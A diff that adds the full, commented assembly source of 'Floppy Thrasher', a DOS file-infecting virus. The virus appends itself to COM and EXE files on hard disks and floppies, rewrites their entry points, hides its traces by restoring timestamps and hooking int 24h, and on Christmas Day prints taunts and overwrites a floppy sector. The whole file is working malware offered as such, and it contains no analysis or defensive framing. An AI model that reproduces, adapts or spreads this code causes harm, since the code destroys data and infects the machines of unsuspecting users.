@@ -1,0 +1,364 @@
+comment *
+Floppy Thasher Virus
+author Virus-X
+infects COM and EXEs  on Floppy and HDs
+Its payload will display a message to screen, print out the printer
+and over write the 1st sector of any floppy in drive A:\
+with text
+*
+
+.model tiny
+.code
+org 100h
+start1:
+db 0e9h,0,0,'D'                               ;1ST GEN Virus is a COM file
+start:
+push ds 
+push cs cs
+pop es ds                                     ;save PSP
+call delta 
+delta:
+pop bp
+sub bp,offset delta                           ;calculate delta offset
+
+push [bp+offset counter]                             ;save counter to stack
+
+cmp byte ptr [bp+counter],1                   ;if counter is 1  EXE restore
+jne exit_COM                                  ;other wise restore 1st 3 bytes
+restore:
+lea si,[bp+EXE_IP]                            ;load SI  with EXE_IP
+lea di,[bp+Saved_ip]                          ;info at exe_ip will be at Saved_IP
+mov cx,4                                      ;number times to move words
+rep movsw                                     ;go
+jmp handlers                                  ;set up our virus to search
+exit_COM: 
+lea si,[bp+tribyte]                           ;get orginal 4 bytes
+mov di,100h                                   ;they will be at file entry
+mov cx,4                                      ;4 times
+rep movsb                                     ;movsb 4 times
+handlers:
+
+call get_dir                                  ;save curent dir
+call int24                                    ;redirect int 24h
+mov ah,19h                                    ;get cur drive number
+int 21h                                       ;DOS
+mov byte ptr [bp+Drive],al                    ;save drive number
+cmp al,00h                                    ;check if we are on DISK
+jne DTAR                                      ;if not set dta
+mov ah,0eh                                    ;otherwise change drive
+mov dl,02h                                    ;to c:\
+int 21h                                       ;DOS!
+mov ah,3Bh                                    ;change dir
+lea dx,[bp+desktop]                           ;go todesktop (users often keep fav stuff on desktop)
+int 21h                                       ;DOS
+DTAR:
+lea dx,[bp+dta]                               ;load effective address of DX with new DTA
+mov ah,1ah                                    ;set new dta
+int 21h
+
+search:
+mov ah,4eh                                    ;find first file
+mov cx,7                                      ;with any attrib
+lea dx,[bp+exefile]                           ;ending in *.EXE
+int 21h                                       ;DOS
+jnc open                                      ;if all Ok open
+jmp COMsearch                                 ;otherwise search for COM files
+NextEXE:
+mov ah,4fh                                    ;find next EXE file
+int 21h                                       ;DOS
+jnc open                                      ;if ok open the file
+jmp COMsearch                                 ;otherwise searchfor some damn COMs
+open:
+mov ax,3d02h                                  ;open read/write
+lea dx,[bp+dta+1eh]                           ;file name in DTA
+int 21h                                       ;DOS!
+xchg ax,bx                                    ;file handle
+call TimeSTAMP                                ;call routine used to save stamps
+mov ah,3fh                                    ;Read Bytes
+mov cx,1ch                                    ;read 1Ch bytes
+lea dx,[bp+exeheader]                         ;store in offset EXEHEADER
+int 21h                                       ;DOS!
+cmp word ptr [bp+exeheader+10h],'DK'          ;is the file already infected?
+je close                                      ;if so close
+cmp word ptr [bp+exeheader+18h],'@'           ;is it a NE or PE file?
+je close                                      ;if so close
+cmp word ptr [bp+exeheader+1ah],0             ;internal overlays?
+jne close                                     ;if yes close
+call save_header                              ;save the exeheader
+mov ax,4202h                                  ;go to eof
+xor cx,cx                                     ;zero out cx
+cwd                                           ;zero dx
+int 21h                                       ;DOS
+push ax dx                                    ;save results
+call calc_newset                              ;calculatenew offsets
+pop dx ax                                     ;restore file size
+call calc_newsize                             ;calculate new size in pages
+mov byte ptr [bp+counter],1                   ;set counter as 1 
+mov ah,40h                                    ;write to file
+mov cx,endvirus-start                         ;virus length
+lea dx,[bp+start]                             ;start at start
+int 21h                                       ;DOS!
+mov ax,4200h                                  ;go to file start
+xor cx,cx                                     ;zero out cx
+cwd                                           ;zero out DX
+int 21h                                       ;DOS
+mov ah,40h                                    ;write to file
+mov cx,1CH                                    ;number of bytes
+lea dx,[bp+exeheader]                         ;write Virulent EXEHEADER
+int 21h                                       ;DOS
+close:
+call set_stamp                                ;set time date stamp
+mov ah,3eh                                    ;close file
+int 21h                                       ;DOS!
+nexter:
+jmp NextEXE                                   ;find Next EXE file
+COMSearch:
+mov ah,4eh                                    ;find first file in Dir
+mov cx,7                                      ;any attributes
+lea dx,[bp+COMFILE]                           ;.COM
+int 21h                                       ;DOS
+jnc openCOM                                   ;if ok open COM file
+jmp changedir                                 ;if not change dir
+nextCOM:  
+mov ah,4fh                                    ;Find another COM
+int 21h                                       ;DOS
+jnc openCOM                                   ;if ok open COM file
+jmp changedir                                 ;if not ok change dir
+openCOM:
+mov ax,3d02h                                  ;open read/write
+lea dx,[bp+dta+1eh]                           ;DTA File name location
+int 21h                                       ;DOS
+xchg ax,bx                                    ;bx = handle
+call TimeSTAMP                                ;save time and date
+cmp word ptr [bp+dta+1ah],24503               ;is the file win.com?
+je closeCOM                                   ;yeah close it                      
+cmp word ptr [bp+dta+35],'DN'                 ;is the file Command.com? 
+je closeCOM                                   ;yeah close it
+mov ax,4202h                                  ;go to eof
+xor cx,cx                                     ;zero cx
+cwd                                           ;zero dx
+int 21h                                       ;DOS!
+sub ax,3                                      ;subtract 3 from file size
+mov word ptr [bp+newjump+1],ax                ;put that value in newjump lower 2 bytes
+mov ax,4200h                                  ;go to file start
+xor cx,cx                                     ;zero cx
+cwd                                           ;zero dx
+int 21h                                       ;DOS
+mov ah,3fh                                    ;read bytes
+lea dx,[bp+tribyte]                           ;into tribyte
+mov cx,4                                      ;4 bytes
+int 21h                                       ;DOS
+cmp byte ptr [bp+tribyte+3],'D'               ;is it already infected?
+je closeCOM                                   ;if so close it
+cmp word ptr [bp+tribyte],'MZ'                ;is it a fricken misnamed EXE file?
+je closeCOM                                   ;ya close it
+cmp word ptr [bp+tribyte],'ZM'                ;misnamed exe?
+je closeCOM                                   ;yeah close it
+mov ax,4200h                                  ;go to file start
+xor cx,cx                                     ;zero cx
+cwd                                           ;zero dx
+int 21h                                       ;DOS
+mov ah,40h                                    ;write bytes
+mov cx,4                                      ;4 bytes
+lea dx,[bp+newjump]                           ;jump to virus code
+int 21h                                       ;DOS
+mov ax,4202h                                  ;move to end of file
+xor cx,cx                                     ;zero cx
+cwd                                           ;zero dx
+int 21h                                       ;DOS
+mov byte ptr [bp+counter],0                   ;zero counter
+mov ah,40h                                    ;write to file
+mov cx,endvirus-start                         ;virus length
+lea dx,[bp+start]                             ;where to start
+int 21h                                       ;DOS
+closeCOM:                                 
+call set_stamp                                ;set time stamp
+mov ah,3eh                                    ;close file
+int 21h                                       ;DOS
+jmp nextCOM                                   ;go find another COM file
+changedir:      
+lea dx,[bp+dot]                               ;'..'
+mov ah,3Bh                                    ;change directory
+int 21h                                       ;DOS!
+jc DISKSWITCH                                 ;if we root lets infect the floppy!
+jmp search                                    ;if all is well search
+DISKSWITCH: 
+mov ah,19h                                    ;get cur drive
+int 21h                                       ;DOS
+cmp al,0                                      ;are we on a disk?
+je check_load                                 ;if so check the payload
+mov ah,0eh                                    ;otherwise change to Disk
+mov dl,0                                      ;0=A:\
+int 21h                                       ;DOS
+jmp search                                    ;if all is ok search for EXEs
+check_load:                                   
+mov ah,2ah                                    ;get system date
+int 21h                                       ;DOS
+cmp dh,12                                     ;is it december?
+jne exit_virus                                ;if not exit virus
+cmp dl,25                                     ;is it christmas
+jne exit_virus                                ;if not exit virus
+mov ah,9h                                     ;display message
+lea dx,[bp+flopper]                           ;offset of message to display
+int 21h                                       ;DOS
+mov ah,01h                                    ;begin of printer payload
+mov dx,0h                                     ;put 0h in dx
+int 17h                                       ;int for initializing printer
+lea si,[bp+str1]                              ;load str to si
+mov cx,ender-str1                             ;move string1len to cx
+PrintStr:                                     ;label fer printing our message
+mov ah,00h                                    ;write characters
+lodsb                                         ;load byte
+int 17h                                       ;printer int
+loop PrintStr                                 ;loop printstr till we are done
+mov ah,03h                                    ;write sector
+mov al,1                                      ;number sectors                 
+mov ch,1                                      ;cylinder number
+mov cl,1                                      ;lower eight bits
+mov dh,1                                      ;head number
+mov dl,00h                                    ;A:\
+lea bx,[bp+sectbuff]                          ;data to write
+push cs
+pop es
+int 13h                                       ;int 13h call
+exit_virus:         
+mov ah,0eh                                    ;change drive
+mov dl,[bp+drive]                             ;back to saved drive
+int 21h                                       ;DOS
+mov ah,3bh                                    ;change dir   
+lea dx,[bp+Cur_Dir]                           ;to original directory
+int 21h                                       ;DOS!
+call rset24                                   ;restore Int 24 Vector
+pop [bp+offset counter]                       ;restore viral counter value
+cmp byte ptr [bp+counter],1                   ;is it a 1?  
+jne COMEXIT                                   ;nope. were on a infected come file COm restore
+pop ds                                        ;restore DS
+mov dx,80h                                    ;80h =defualt DTA
+mov ah,1ah                                    ;set dta
+int 21h                                       ;DOS!
+push    ds                                    ;push es
+pop     es                                    ;pop es restore es = ds =PSP
+mov     ax,es                                 ;es = ax
+add     ax,10h                                ;add ajustment for PSP 
+add     word ptr cs:[Saved_CS+bp],ax          ;Adjust old CS by cur sig                                                 
+cli                                           ;clear interrupt flags
+add     ax,word ptr cs:[bp+Saved_SS]          ;Adjust old SS
+mov     ss,ax                                 ;Restore stack to
+mov     sp,word ptr cs:[bp+Saved_SP]          ;original position
+sti                                           ;restore int flags
+db      0eah                                  ;far jump to CS:IP   
+Saved_IP        dw      0                     ;storage for original IP
+Saved_CS        dw      0                     ;storage for original CS
+Saved_SP        dw      0                     ;storage for original SP
+Saved_SS        dw      0                     ;storage for original SS
+
+
+
+comEXIT:
+mov dx,80h                                    ;80h = default DTA
+mov ah,1ah                                    ;set DTA
+int 21h                                       ;DOS
+mov di,100h                                   ;ax = 100h, file entry point
+jmp di                                        ;go to entry
+
+;-----Procedures-----------;
+get_dir:
+mov  ah,47h                                   ;get current directory
+cwd                                           ;xor dx,dx      
+lea  si,[bp+Cur_DIR]                          ;buffer
+int  21h                                      ;DOS!
+ret                                           ;return
+int24:            
+mov ax,3524h                                  ;get int vector 24
+int 21h                                       ;DOS!
+mov word ptr [bp+old24],bx                    ;store bx in lower word
+mov word ptr [bp+old24+2],es                  ;es in high word of offset old24
+mov ax,2524h                                  ;set int vector
+lea dx,[bp+new24h]                            ;offset of new24h routine
+int 21h                                       ;DOS!
+ret                                           ;return
+new24h:                 
+mov al,3                                      ;fail error
+iret                                          ;interrupt return
+timeSTAMP:
+mov ax,5700h                                  ;get time and date
+int 21h                                       ;dos
+mov word ptr [bp+date1],cx                    ;save cx in offset date1
+mov word ptr [bp+date2],dx                    ;save dx in offset date2
+ret                                           ;return
+
+
+
+save_header:
+mov ax,word ptr [bp+exeheader+10h]            ;get SP      
+mov word ptr [bp+exe_sp],ax                   ;save SP
+mov ax,word ptr [bp+Exeheader+16h]            ;get CS
+mov word ptr [bp+exe_cs],ax                   ;save CS
+mov ax,word ptr [bp+exeheader+14h]            ;get IP
+mov word ptr [bp+exe_ip],ax                   ;save IP
+mov ax,word ptr [bp+exeheader+0eh]            ;get SS
+mov word ptr [bp+exe_ss],ax                   ;save SS
+ret                                           ;return
+
+calc_newset:
+mov cx,10h
+div cx
+sub ax,word ptr [bp+exeheader+8h]            ;filesizez - headersize=we want 
+mov word ptr [bp+exeheader+14h],dx           ;NEW IP 
+mov word ptr [bp+exeheader+16h],ax           ;NEW CS
+mov word ptr [bp+exeheader+0eh],ax           ;NEW SS
+mov word ptr [bp+exeheader+10h],'DK'         ;NEW SP
+ret                                          ;return
+calc_newsize:
+add ax,endvirus-start                        ;add virus size to f-size
+adc dx,0                                     ;add carry
+mov cx,200h                                  ;200h = 512 hex
+div cx                                       ;divide file into pages
+cmp dx,0                                     ;check if dx is equal 0
+je  continue                                 ;if so continue
+inc ax                                       ;incremnet AX          
+continue:      
+mov word ptr [bp+exeheader+4h],ax            ;set new partpag
+mov word ptr [bp+exeheader+2h],dx            ;set new PageCnt
+ret                                          ;return
+set_stamp:
+mov ax,5701h                                 ;set time and date stamp
+lea cx,[bp+date1]                            ;set cx for old value
+lea dx,[bp+date2]                            ;set dx for old value
+int 21h                                      ;DOS
+ret                                          ;return
+rset24:
+mov ax,2524h                                 ;set IVT 24h
+lea dx,[bp+old24]                            ;point to old 24h
+int 21h                                      ;DOS
+ret                                          ;return
+;-----data----------;
+date1 dw ?
+date2 dw ?
+desktop db 'C:\windows\desktop',0
+Cur_DIR   db   64 dup (0)                    ;storage for Dir info
+dot       db   '..',0
+old24 dd ?
+exefile db '*.exe',0
+comfile db '*.com',0
+newjump db 0e9h,0,0,'D'
+tribyte db 0cdh,20h,0,0
+exeheader db 1ch dup (?)
+DTA     db 42 dup (?)
+counter db 0
+drive   db 0
+sectbuff db 'This floppy thrashed by Floppy Thrasher Virus',0
+flopper db 'Floppy Thrasher (c) 1998',10,13
+        db 'Floppy in drive A:\ being thrashed......',10,13
+        db 'thank you for being infected have a nice day ',10,13,'$'
+exe_ip   dw  0                               ;storage for IP
+exe_cs   dw  0fff0h                          ;storage for CS
+exe_sp   dw  0                               ;storage for SP
+exe_ss   dw  0fff0h                          ;storage for SS
+str1 db 'Floppy Thrasher......Infecting COM and EXE files for along time......',0ah,0dh
+     db 'have you been a good user this year? i think not......thus the floppy in drive A must DIE',0ah,0dh
+     db 'Your  computer is infected with floppy thrasher muhahahahahah',0ah,0dh
+     db 'remmeber my name for i am the floppy thrasher Virus',0Ch
+ender label near
+endvirus label near
+end  start1
